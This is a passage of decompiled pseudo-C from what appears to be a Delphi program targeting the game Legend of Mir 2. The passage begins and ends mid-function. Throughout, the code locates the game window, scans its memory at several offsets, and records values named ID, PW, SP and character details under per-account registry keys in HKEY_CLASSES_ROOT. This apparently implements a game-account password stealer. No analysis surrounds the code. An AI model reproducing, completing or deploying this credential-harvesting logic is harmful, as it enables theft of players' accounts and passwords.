      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsZ1", 1, (BYTE *)v14);
      v15 = sub_40471C(*(char **)(*off_42B87C + 12));
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsD1", 1, (BYTE *)v15);
      sub_424C9C(*(_DWORD *)(*off_42B87C + 16), 1, (volatile __int32 *)&v49);
      v16 = sub_40471C(v49);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsS1", 1, (BYTE *)v16);
    }
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", 1, (BYTE *)"1");
  }
  if ( a1 == 10 )
  {
    sub_404304((volatile __int32 *)&v67, *(_DWORD *)(*off_42B87C + 20));
    Delphi_Copy_40477C((int)v67, 1, 1, &v48);
    Delphi_CompareCall_404668((int)v48, &dword_425474);
    if ( v8 )
      sub_4047BC(&v67, 1, 1);
    v34 = sub_40471C(v67);
    sub_404570((volatile __int32 *)&v47, "legend of mir2\\Enter\\", v68);
    v17 = sub_40471C(v47);
    sub_40E67C(HKEY_CLASSES_ROOT, v17, "JsN2", 1, (BYTE *)v34);
    sub_424C9C(*(_DWORD *)(*off_42B87C + 24), 0, (volatile __int32 *)&v46);
    v35 = sub_40471C(v46);
    sub_404570((volatile __int32 *)&v45, "legend of mir2\\Enter\\", v68);
    v18 = sub_40471C(v45);
    sub_40E67C(HKEY_CLASSES_ROOT, v18, "JsZ2", 1, (BYTE *)v35);
    v36 = sub_40471C(*(char **)(*off_42B87C + 32));
    sub_404570((volatile __int32 *)&v44, "legend of mir2\\Enter\\", v68);
    v19 = sub_40471C(v44);
    sub_40E67C(HKEY_CLASSES_ROOT, v19, "JsD2", 1, (BYTE *)v36);
    sub_424C9C(*(_DWORD *)(*off_42B87C + 36), 1, (volatile __int32 *)&v43);
    v37 = sub_40471C(v43);
    sub_404570((volatile __int32 *)&v42, "legend of mir2\\Enter\\", v68);
    v20 = sub_40471C(v42);
    sub_40E67C(HKEY_CLASSES_ROOT, v20, "JsS2", 1, (BYTE *)v37);
    v21 = sub_40471C(v67);
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsN2", 1, (BYTE *)v21);
    sub_424C9C(*(_DWORD *)(*off_42B87C + 24), 0, (volatile __int32 *)&v41);
    v22 = sub_40471C(v41);
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsZ2", 1, (BYTE *)v22);
    v23 = sub_40471C(*(char **)(*off_42B87C + 32));
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsD2", 1, (BYTE *)v23);
    sub_424C9C(*(_DWORD *)(*off_42B87C + 36), 1, (volatile __int32 *)&v40);
    v24 = sub_40471C(v40);
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsS2", 1, (BYTE *)v24);
  }
  __writefsdword(0, v38[0]);
  v39 = (int *)&loc_425407;
  return sub_404290((int)&v40, 29);
}
// 425003: variable 'v8' is possibly undefined
// 425474: using guessed type int dword_425474;
// 42B87C: using guessed type int *off_42B87C;

//----- (004254C4) --------------------------------------------------------
int __usercall sub_4254C4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  char *v3; // eax
  char v4; // zf
  char *v5; // ecx
  char *v6; // eax
  char *v7; // eax
  char *v8; // eax
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  int v14; // ebx
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  char *v27; // eax
  int v28; // eax
  char *v29; // eax
  char *v30; // eax
  char *v31; // eax
  char *v32; // eax
  char *v33; // eax
  char *v34; // eax
  char *v35; // eax
  char *v36; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-104h] BYREF
  int v39; // [esp-14h] [ebp-100h]
  BYTE *v40; // [esp-10h] [ebp-FCh]
  unsigned int v41[2]; // [esp-Ch] [ebp-F8h] BYREF
  int *v42; // [esp-4h] [ebp-F0h]
  char *v43; // [esp+Ch] [ebp-E0h] BYREF
  char *v44; // [esp+10h] [ebp-DCh] BYREF
  char *v45; // [esp+14h] [ebp-D8h] BYREF
  char *v46; // [esp+18h] [ebp-D4h] BYREF
  char *v47; // [esp+1Ch] [ebp-D0h] BYREF
  char *v48; // [esp+20h] [ebp-CCh] BYREF
  char *v49; // [esp+24h] [ebp-C8h] BYREF
  char *v50; // [esp+28h] [ebp-C4h] BYREF
  char *v51; // [esp+2Ch] [ebp-C0h] BYREF
  char *v52; // [esp+30h] [ebp-BCh] BYREF
  char *v53; // [esp+34h] [ebp-B8h] BYREF
  char *v54; // [esp+38h] [ebp-B4h] BYREF
  char *v55; // [esp+3Ch] [ebp-B0h] BYREF
  char *v56; // [esp+40h] [ebp-ACh] BYREF
  char *v57; // [esp+44h] [ebp-A8h] BYREF
  char *v58; // [esp+48h] [ebp-A4h] BYREF
  char *v59; // [esp+4Ch] [ebp-A0h] BYREF
  char *v60; // [esp+50h] [ebp-9Ch] BYREF
  char *v61; // [esp+54h] [ebp-98h] BYREF
  char *v62; // [esp+58h] [ebp-94h] BYREF
  char *v63; // [esp+5Ch] [ebp-90h] BYREF
  char *v64; // [esp+60h] [ebp-8Ch] BYREF
  char *v65; // [esp+64h] [ebp-88h] BYREF
  char *v66; // [esp+68h] [ebp-84h] BYREF
  char *v67; // [esp+6Ch] [ebp-80h] BYREF
  char *v68; // [esp+70h] [ebp-7Ch] BYREF
  char *v69; // [esp+74h] [ebp-78h] BYREF
  char *v70; // [esp+78h] [ebp-74h] BYREF
  char *v71; // [esp+7Ch] [ebp-70h] BYREF
  char *v72; // [esp+80h] [ebp-6Ch] BYREF
  char *v73; // [esp+84h] [ebp-68h] BYREF
  char *v74; // [esp+88h] [ebp-64h] BYREF
  char *v75; // [esp+8Ch] [ebp-60h] BYREF
  char *v76; // [esp+90h] [ebp-5Ch] BYREF
  char *v77; // [esp+94h] [ebp-58h] BYREF
  char *v78; // [esp+98h] [ebp-54h] BYREF
  char *v79; // [esp+9Ch] [ebp-50h] BYREF
  char *v80; // [esp+A0h] [ebp-4Ch] BYREF
  char *v81; // [esp+A4h] [ebp-48h] BYREF
  char *v82; // [esp+A8h] [ebp-44h] BYREF
  __int32 v83; // [esp+ACh] [ebp-40h] BYREF
  __int32 v84; // [esp+B0h] [ebp-3Ch] BYREF
  __int32 v85; // [esp+B4h] [ebp-38h] BYREF
  __int32 v86; // [esp+B8h] [ebp-34h] BYREF
  __int32 v87; // [esp+BCh] [ebp-30h] BYREF
  __int32 v88; // [esp+C0h] [ebp-2Ch] BYREF
  __int32 v89; // [esp+C4h] [ebp-28h] BYREF
  char *v90; // [esp+C8h] [ebp-24h] BYREF
  char *v91; // [esp+CCh] [ebp-20h] BYREF
  char *v92; // [esp+D0h] [ebp-1Ch] BYREF
  char *v93; // [esp+D4h] [ebp-18h] BYREF
  char v94; // [esp+DBh] [ebp-11h]
  BYTE *v95; // [esp+DCh] [ebp-10h] BYREF
  char *v96; // [esp+E0h] [ebp-Ch] BYREF
  char *v97; // [esp+E4h] [ebp-8h] BYREF
  HWND WindowA; // [esp+E8h] [ebp-4h]
  int savedregs; // [esp+ECh] [ebp+0h] BYREF

  v42 = &savedregs;
  v41[1] = (unsigned int)&loc_426224;
  v41[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v41);
  WindowA = FindWindowA("TfrmMain", "legend of mir2");
  if ( !WindowA )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v97);
    if ( v97 )
    {
      v3 = sub_40471C(v97);
      WindowA = FindWindowA("TfrmMain", v3);
    }
  }
  if ( WindowA )
  {
    PeekMessageA(&Msg, 0, 0, 0, 1u);
    v94 = 0;
    sub_40426C(&v95);
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v93);
    Delphi_CompareCall_404668((int)v93, &dword_42626C);
    if ( !v4 )
      goto LABEL_11;
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "NowCount", &v92);
    if ( v92 )
    {
      v40 = (BYTE *)&savedregs;
      v39 = (int)&loc_4255DF;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "NowCount", &v91);
      a1 = sub_40C610((int)v91, v5);
      __writefsdword(0, (unsigned int)ExceptionList);
    }
    else
    {
      a1 = 0;
    }
    if ( a1 < 5 )
    {
      sub_40C670(a1 + 1, (volatile __int32 *)&v90);
      v6 = sub_40471C(v90);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "NowCount", 1, (BYTE *)v6);
    }
    else
    {
LABEL_11:
      sub_42478C(0x1C2u, "4F7EFD", (volatile __int32 *)&v96, 1);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v89, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v89);
      v7 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "zb1", 1, (BYTE *)v7);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "zb1", &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_426298;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      sub_4047BC(&v96, 1, 104);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v88, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v88);
      v8 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "zb2", 1, (BYTE *)v8);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "zb2", &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_4262BC;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      sub_4047BC(&v96, 1, 208);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v87, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v87);
      v9 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262C4, 1, (BYTE *)v9);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262C4, &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_4262D0;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      sub_4047BC(&v96, 1, 208);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v86, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v86);
      v10 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262D8, 1, (BYTE *)v10);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262D8, &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_4262E4;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      sub_4047BC(&v96, 1, 104);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v85, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v85);
      v11 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262EC, 1, (BYTE *)v11);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262EC, &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_4262F8;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      sub_4047BC(&v96, 1, 104);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v84, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v84);
      v12 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426300, 1, (BYTE *)v12);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426300, &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_42630C;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      sub_4047BC(&v96, 1, 104);
      Delphi_Copy_40477C((int)v96, 1, 20, &v97);
      sub_40DA70((int)v97, 1, &v83, a1, a2, a3);
      sub_404304((volatile __int32 *)&v97, v83);
      v13 = sub_40471C(v97);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426314, 1, (BYTE *)v13);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426314, &v97);
      if ( sub_404524((int)v97) > 1 )
      {
        v40 = v95;
        v39 = (int)dword_426320;
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v97;
        sub_4045E4((volatile __int32 *)&v95, 4);
        v94 = 1;
      }
      if ( v94 )
      {
        v14 = 1;
        sub_40426C(&v97);
        while ( 1 )
        {
          sub_40C670(v14, (volatile __int32 *)&v82);
          v15 = sub_40471C(v82);
          if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Enter", v15) )
            break;
          if ( ++v14 > 99 )
            goto LABEL_30;
        }
        sub_40C670(v14, (volatile __int32 *)&v97);
LABEL_30:
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426340, &v81);
        v40 = (BYTE *)sub_40471C(v81);
        v39 = 1;
        sub_404570((volatile __int32 *)&v80, "legend of mir2\\Enter\\", v97);
        v16 = sub_40471C(v80);
        sub_40E67C(HKEY_CLASSES_ROOT, v16, (const CHAR *)dword_426340, v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ID", &v79);
        v40 = (BYTE *)sub_40471C(v79);
        v39 = 1;
        sub_404570((volatile __int32 *)&v78, "legend of mir2\\Enter\\", v97);
        v17 = sub_40471C(v78);
        sub_40E67C(HKEY_CLASSES_ROOT, v17, "ID", v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "PW", &v77);
        v40 = (BYTE *)sub_40471C(v77);
        v39 = 1;
        sub_404570((volatile __int32 *)&v76, "legend of mir2\\Enter\\", v97);
        v18 = sub_40471C(v76);
        sub_40E67C(HKEY_CLASSES_ROOT, v18, "PW", v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "SP", &v75);
        v40 = (BYTE *)sub_40471C(v75);
        v39 = 1;
        sub_404570((volatile __int32 *)&v74, "legend of mir2\\Enter\\", v97);
        v19 = sub_40471C(v74);
        sub_40E67C(HKEY_CLASSES_ROOT, v19, "SP", v39, v40);
        if ( (unsigned __int8)sub_40E944("JsN1", HKEY_CLASSES_ROOT, "legend of mir2", v14)
          && (unsigned __int8)sub_40E944("JsD1", HKEY_CLASSES_ROOT, "legend of mir2", v14) )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsN1", &v73);
          v40 = (BYTE *)sub_40471C(v73);
          v39 = 1;
          sub_404570((volatile __int32 *)&v72, "legend of mir2\\Enter\\", v97);
          v20 = sub_40471C(v72);
          sub_40E67C(HKEY_CLASSES_ROOT, v20, "JsN1", v39, v40);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsZ1", &v71);
          v40 = (BYTE *)sub_40471C(v71);
          v39 = 1;
          sub_404570((volatile __int32 *)&v70, "legend of mir2\\Enter\\", v97);
          v21 = sub_40471C(v70);
          sub_40E67C(HKEY_CLASSES_ROOT, v21, "JsZ1", v39, v40);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsD1", &v69);
          v40 = (BYTE *)sub_40471C(v69);
          v39 = 1;
          sub_404570((volatile __int32 *)&v68, "legend of mir2\\Enter\\", v97);
          v22 = sub_40471C(v68);
          sub_40E67C(HKEY_CLASSES_ROOT, v22, "JsD1", v39, v40);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsS1", &v67);
          v40 = (BYTE *)sub_40471C(v67);
          v39 = 1;
          sub_404570((volatile __int32 *)&v66, "legend of mir2\\Enter\\", v97);
          v23 = sub_40471C(v66);
          sub_40E67C(HKEY_CLASSES_ROOT, v23, "JsS1", v39, v40);
        }
        if ( (unsigned __int8)sub_40E944("JsN2", HKEY_CLASSES_ROOT, "legend of mir2", v14)
          && (unsigned __int8)sub_40E944("JsD2", HKEY_CLASSES_ROOT, "legend of mir2", v14) )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsN2", &v65);
          v40 = (BYTE *)sub_40471C(v65);
          v39 = 1;
          sub_404570((volatile __int32 *)&v64, "legend of mir2\\Enter\\", v97);
          v24 = sub_40471C(v64);
          sub_40E67C(HKEY_CLASSES_ROOT, v24, "JsN2", v39, v40);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsZ2", &v63);
          v40 = (BYTE *)sub_40471C(v63);
          v39 = 1;
          sub_404570((volatile __int32 *)&v62, "legend of mir2\\Enter\\", v97);
          v25 = sub_40471C(v62);
          sub_40E67C(HKEY_CLASSES_ROOT, v25, "JsZ2", v39, v40);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsD2", &v61);
          v40 = (BYTE *)sub_40471C(v61);
          v39 = 1;
          sub_404570((volatile __int32 *)&v60, "legend of mir2\\Enter\\", v97);
          v26 = sub_40471C(v60);
          sub_40E67C(HKEY_CLASSES_ROOT, v26, "JsD2", v39, v40);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsS2", &v59);
          v40 = (BYTE *)sub_40471C(v59);
          v39 = 1;
          sub_404570((volatile __int32 *)&v58, "legend of mir2\\Enter\\", v97);
          v27 = sub_40471C(v58);
          sub_40E67C(HKEY_CLASSES_ROOT, v27, "JsS2", v39, v40);
        }
        v28 = sub_404524((int)v95);
        sub_4047BC((char **)&v95, v28, 1);
        v40 = (BYTE *)sub_40471C((char *)v95);
        v39 = 1;
        sub_404570((volatile __int32 *)&v57, "legend of mir2\\Enter\\", v97);
        v29 = sub_40471C(v57);
        sub_40E67C(HKEY_CLASSES_ROOT, v29, "ZB", v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "zb1", &v56);
        v40 = (BYTE *)sub_40471C(v56);
        v39 = 1;
        sub_404570((volatile __int32 *)&v55, "legend of mir2\\Enter\\", v97);
        v30 = sub_40471C(v55);
        sub_40E67C(HKEY_CLASSES_ROOT, v30, "zb1", v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "zb2", &v54);
        v40 = (BYTE *)sub_40471C(v54);
        v39 = 1;
        sub_404570((volatile __int32 *)&v53, "legend of mir2\\Enter\\", v97);
        v31 = sub_40471C(v53);
        sub_40E67C(HKEY_CLASSES_ROOT, v31, "zb2", v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262C4, &v52);
        v40 = (BYTE *)sub_40471C(v52);
        v39 = 1;
        sub_404570((volatile __int32 *)&v51, "legend of mir2\\Enter\\", v97);
        v32 = sub_40471C(v51);
        sub_40E67C(HKEY_CLASSES_ROOT, v32, (const CHAR *)dword_4262C4, v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262D8, &v50);
        v40 = (BYTE *)sub_40471C(v50);
        v39 = 1;
        sub_404570((volatile __int32 *)&v49, "legend of mir2\\Enter\\", v97);
        v33 = sub_40471C(v49);
        sub_40E67C(HKEY_CLASSES_ROOT, v33, (const CHAR *)dword_4262D8, v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4262EC, &v48);
        v40 = (BYTE *)sub_40471C(v48);
        v39 = 1;
        sub_404570((volatile __int32 *)&v47, "legend of mir2\\Enter\\", v97);
        v34 = sub_40471C(v47);
        sub_40E67C(HKEY_CLASSES_ROOT, v34, (const CHAR *)dword_4262EC, v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426300, &v46);
        v40 = (BYTE *)sub_40471C(v46);
        v39 = 1;
        sub_404570((volatile __int32 *)&v45, "legend of mir2\\Enter\\", v97);
        v35 = sub_40471C(v45);
        sub_40E67C(HKEY_CLASSES_ROOT, v35, (const CHAR *)dword_426300, v39, v40);
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_426314, &v44);
        v40 = (BYTE *)sub_40471C(v44);
        v39 = 1;
        sub_404570((volatile __int32 *)&v43, "legend of mir2\\Enter\\", v97);
        v36 = sub_40471C(v43);
        sub_40E67C(HKEY_CLASSES_ROOT, v36, (const CHAR *)dword_426314, v39, v40);
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Flag2", 1, (BYTE *)"1");
      }
    }
  }
  __writefsdword(0, v41[0]);
  v42 = (int *)&loc_42622B;
  sub_404290((int)&v43, 51);
  return sub_404290((int)&v95, 3);
}
// 42557D: variable 'v4' is possibly undefined
// 4255CE: variable 'v5' is possibly undefined
// 42626C: using guessed type int dword_42626C;
// 426298: using guessed type int dword_426298[4];
// 4262BC: using guessed type int dword_4262BC[2];
// 4262C4: using guessed type int dword_4262C4[3];
// 4262D0: using guessed type int dword_4262D0[2];
// 4262D8: using guessed type int dword_4262D8[3];
// 4262E4: using guessed type int dword_4262E4[2];
// 4262EC: using guessed type int dword_4262EC[3];
// 4262F8: using guessed type int dword_4262F8[2];
// 426300: using guessed type int dword_426300[3];
// 42630C: using guessed type int dword_42630C[2];
// 426314: using guessed type int[3];
// 426320: using guessed type int dword_426320[2];
// 426340: using guessed type int dword_426340[2];

//----- (004264A4) --------------------------------------------------------
char __usercall sub_4264A4@<al>(int a1@<eax>)
{
  char v2; // zf
  int v3; // esi
  char **v4; // ebx
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  char *v13; // eax
  int v14; // eax
  int v15; // eax
  char *v16; // eax
  unsigned int v18[2]; // [esp-Ch] [ebp-40h] BYREF
  int *v19; // [esp-4h] [ebp-38h]
  char *v20; // [esp+Ch] [ebp-28h] BYREF
  char *v21; // [esp+10h] [ebp-24h] BYREF
  char *v22; // [esp+14h] [ebp-20h] BYREF
  char *v23; // [esp+18h] [ebp-1Ch] BYREF
  char *v24; // [esp+1Ch] [ebp-18h] BYREF
  char *v25; // [esp+20h] [ebp-14h] BYREF
  char *v26; // [esp+24h] [ebp-10h] BYREF
  int *v27; // [esp+28h] [ebp-Ch] BYREF
  int v28; // [esp+2Ch] [ebp-8h] BYREF
  char v29; // [esp+33h] [ebp-1h]
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v19 = &savedregs;
  v18[1] = (unsigned int)&loc_426992;
  v18[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v18);
  v29 = 0;
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v25);
  Delphi_CompareCall_404668((int)v25, &dword_4269C4);
  if ( v2 )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_4269C8, &v24);
    if ( v24 )
    {
      if ( dword_42E154 )
      {
        sub_42433C(
          *(&off_42B7F8 + dword_42E154),
          (&off_42B7E4)[a1],
          "1800",
          (volatile __int32 *)&v27,
          0,
          0,
          &v28,
          (volatile __int32 *)&v26,
          0,
          0,
          0,
          0,
          12);
      }
      else
      {
        v3 = 1;
        v4 = off_42B7FC;
        while ( 1 )
        {
          PeekMessageA(&Msg, 0, 0, 0, 1u);
          sub_42433C(
            *v4,
            (&off_42B7E4)[a1],
            "1800",
            (volatile __int32 *)&v27,
            0,
            0,
            &v28,
            (volatile __int32 *)&v26,
            0,
            0,
            0,
            0,
            12);
          if ( v28 )
            break;
          ++v3;
          ++v4;
          if ( v3 == 6 )
            goto LABEL_10;
        }
        dword_42E154 = v3;
        sub_40C670(v3, (volatile __int32 *)&v23);
        v5 = sub_40471C(v23);
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "addressC", 1, (BYTE *)v5);
        sub_40C670(a1, (volatile __int32 *)&v22);
        v6 = sub_40471C(v22);
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "addressuse1", 1, (BYTE *)v6);
        sub_40C670(v28, (volatile __int32 *)&v21);
        v7 = sub_40471C(v21);
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "addressuse2", 1, (BYTE *)v7);
        v29 = 1;
      }
LABEL_10:
      if ( v28 )
      {
        switch ( dword_42E154 )
        {
          case 1:
            v8 = sub_404524((int)*(&off_42B7F8 + 1));
            sub_40DA30(1, &v26, v28 - 20 - v8 / 2, (v28 - 20 - v8 / 2) >> 31);
            sub_42478C(0xCu, v26, (volatile __int32 *)&v27, 0);
            if ( !v27 )
            {
              v9 = sub_404524((int)*(&off_42B7F8 + dword_42E154));
              sub_40DA30(1, &v26, v28 - 48 - v9 / 2, (v28 - 48 - v9 / 2) >> 31);
              sub_42478C(0xCu, v26, (volatile __int32 *)&v27, 0);
              if ( !v27 )
              {
                v10 = sub_404524((int)*(&off_42B7F8 + dword_42E154));
                sub_40DA30(1, &v26, v28 - 40 - v10 / 2, (v28 - 40 - v10 / 2) >> 31);
              }
            }
            break;
          case 2:
            sub_40DA30(1, &v26, v28, v28 >> 31);
            v13 = sub_40471C(v26);
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "PWaaa", 1, (BYTE *)v13);
            break;
          case 3:
            v11 = sub_404524((int)*(&off_42B7F8 + 3));
            sub_40DA30(1, &v26, v28 + 64 - v11 / 2, (v28 - 192 - v11 / 2) >> 31);
            sub_42478C(0xCu, v26, (volatile __int32 *)&v27, 0);
            if ( !v27 )
              goto LABEL_25;
            break;
          case 4:
            v12 = sub_404524((int)*(&off_42B7F8 + 4));
            sub_40DA30(1, &v26, v28 + 80 - v12 / 2, (v28 - 176 - v12 / 2) >> 31);
            sub_42478C(0xCu, v26, (volatile __int32 *)&v27, 0);
            if ( !v27 )
              goto LABEL_25;
            break;
          default:
            v14 = sub_404524((int)*(&off_42B7F8 + dword_42E154));
            sub_40DA30(1, &v26, v28 - 40 - v14 / 2, (v28 - 40 - v14 / 2) >> 31);
            sub_42478C(0xCu, v26, (volatile __int32 *)&v27, 0);
            if ( !v27 )
            {
LABEL_25:
              v15 = sub_404524((int)*(&off_42B7F8 + dword_42E154)) / 2;
              sub_40DA30(1, &v26, v28 - 36 - v15, (v28 - 36 - v15) >> 31);
            }
            break;
        }
        sub_42478C(0xCu, v26, (volatile __int32 *)&v27, 0);
        if ( v27 )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "PW", &v20);
          Delphi_CompareCall_404668((int)v20, v27);
          if ( !v2 )
          {
            v16 = sub_40471C((char *)v27);
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "PW", 1, (BYTE *)v16);
            v29 = 1;
          }
        }
      }
    }
  }
  __writefsdword(0, v18[0]);
  v19 = (int *)&loc_426999;
  sub_404290((int)&v20, 8);
  return v29;
}
// 4264EF: variable 'v2' is possibly undefined
// 4269C4: using guessed type int dword_4269C4;
// 4269C8: using guessed type int dword_4269C8[3];
// 42B7E4: using guessed type char *off_42B7E4;
// 42B7F8: using guessed type void *off_42B7F8;
// 42B7FC: using guessed type char *off_42B7FC[5];
// 42E154: using guessed type int dword_42E154;
// 4264A4: using guessed type int var_8;

//----- (00426A0C) --------------------------------------------------------
int __usercall sub_426A0C@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v7; // ebx
  char *v8; // eax
  char *v9; // eax
  unsigned int v11[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v12; // [esp-10h] [ebp-24h]
  int v13; // [esp-Ch] [ebp-20h]
  int v14; // [esp-8h] [ebp-1Ch]
  int v15; // [esp-4h] [ebp-18h]
  char *v16; // [esp+0h] [ebp-14h] BYREF
  char *v17; // [esp+4h] [ebp-10h] BYREF
  __int32 v18; // [esp+8h] [ebp-Ch] BYREF
  char *v19; // [esp+Ch] [ebp-8h] BYREF
  int v20; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = a3;
  v14 = a5;
  v13 = a4;
  v12 = &savedregs;
